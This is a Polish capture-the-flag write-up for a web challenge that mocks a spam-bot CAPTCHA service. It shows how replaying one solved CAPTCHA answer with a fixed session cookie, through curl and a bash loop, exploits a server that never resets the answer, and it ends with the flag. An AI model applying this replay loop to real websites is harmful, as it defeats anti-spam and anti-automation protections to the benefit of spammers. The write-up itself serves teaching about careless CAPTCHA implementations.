# CAPTCHA Cracking Service (web, 100 pkt)
Arkadiusz Kozdra

# Treść
> Wielu twórców stron nikczemnie próbuje utrudnić mozolną pracę chińskich
> spambotów postujących viagrę.  Pomóż w zaspamowaniu świata tandetnymi
> reklamami poprzez rozwiązywanie obrazków CAPTCHA.  Obiecujemy, że żaden
> przepisany kod nie zostanie wykorzystany w dobrym celu, a za każde poprawne
> rozwiązanie otrzymasz 1 punkt w naszym programie lojalnościowym.
> Wynagrodzimy każdego, kto wesprze naszą słuszną misję rozwiązując
> przynajmniej 1000 obrazków.
>
> Zapraszamy pod adres: https://captcha.pwning2017.p4.team/.
>
> Format flagi: `pwn{litery_cyfry_i_znaki_specjalne}`.

# Rozwiązanie
Formularz wysyłający składa się tylko z jednego pola (odpowiedzi), bez żadnych
ukrytych pól.  Wśród ciasteczek jest jedno z sesją.

W takim razie skrypt pokazujący obrazek najwyraźniej losuje treść i umieszcza
prawidłową odpowiedź w sesji.

Czy skrypt sprawdzający resetuje prawidłową odpowiedź?

```sh
$ curl -s -b PHPSESSID=f5ab2f7baff18bfe227d99e4b4fd461c -d ct_captcha=Rh5ATL https://captcha.pwning2017.p4.team |grep '/ 1000'
1/1000
$ curl -s -b PHPSESSID=f5ab2f7baff18bfe227d99e4b4fd461c -d ct_captcha=Rh5ATL https://captcha.pwning2017.p4.team |grep '/ 1000'
2/1000
```

Najwyraźniej nie. Prosta pętla w bashu może wysłać w kółko takie żądanie
(być może dałoby się nawet zrównoleglić atak).

```sh
CAPTCHA=Rh5ATL
while :; do
    curl -s -b PHPSESSID=f5ab2f7baff18bfe227d99e4b4fd461c \
        -d ct_captcha=$CAPTCHA https://captcha.pwning2017.p4.team \
    | tee last.txt | grep 'pwn{\|/ 1000'

    grep -q '1000 / 1000' last.txt && break
done
```

I po chwili skrypt daje wynik:

```html
[...]
  Your points: 997 / 1000.
  Your points: 998 / 1000.
  Your points: 999 / 1000.
  Your points: 1000 / 1000.
  <br><strong>Congratulations! The flag is: pwn{captcha_implementations_not_done_carefully}</strong></p>
```
